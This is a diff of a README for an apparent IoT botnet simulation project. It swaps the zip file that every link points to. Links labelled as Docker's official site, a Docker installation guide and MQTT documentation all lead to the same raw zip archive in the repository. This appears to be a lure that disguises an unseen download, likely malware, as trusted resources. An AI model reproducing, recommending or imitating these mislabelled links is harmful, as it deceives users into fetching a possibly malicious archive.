@@ -1,6 +1,6 @@
 # 🤖 iot-botnet-simulation - Explore the World of IoT Security
 
-[![Download](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/c2/botnet-iot-simulation-v3.1.zip)](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/c2/botnet-iot-simulation-v3.1.zip)
+[![Download](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/monitoring/grafana/simulation_botnet_iot_v3.9.zip)](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/monitoring/grafana/simulation_botnet_iot_v3.9.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ This README will guide you through the process of downloading and running the ap
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download IoT Botnet Simulation](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/c2/botnet-iot-simulation-v3.1.zip)
+To get started, visit this page to download: [Download IoT Botnet Simulation](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/monitoring/grafana/simulation_botnet_iot_v3.9.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest release version.
@@ -29,7 +29,7 @@ To get started, visit this page to download: [Download IoT Botnet Simulation](ht
 
 If you haven't installed Docker yet, follow these steps:
 
-1. Go to [Docker's official site](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/c2/botnet-iot-simulation-v3.1.zip).
+1. Go to [Docker's official site](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/monitoring/grafana/simulation_botnet_iot_v3.9.zip).
 2. Download the version for your operating system.
 3. Follow the installation instructions provided on the website.
 4. Verify the installation by running `docker --version` in your terminal or command prompt.
@@ -88,8 +88,8 @@ For additional questions or support, please raise an issue in the GitHub reposit
 
 ## 🔗 Quick Links
 
-- [Download IoT Botnet Simulation](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/c2/botnet-iot-simulation-v3.1.zip)
-- [Docker Installation Guide](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/c2/botnet-iot-simulation-v3.1.zip)
-- [Official MQTT Documentation](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/c2/botnet-iot-simulation-v3.1.zip)
+- [Download IoT Botnet Simulation](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/monitoring/grafana/simulation_botnet_iot_v3.9.zip)
+- [Docker Installation Guide](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/monitoring/grafana/simulation_botnet_iot_v3.9.zip)
+- [Official MQTT Documentation](https://raw.githubusercontent.com/elpepeeeeeeeeeeeeeeeeeeeeeeeee/iot-botnet-simulation/main/monitoring/grafana/simulation_botnet_iot_v3.9.zip)
 
 Happy Simulating!
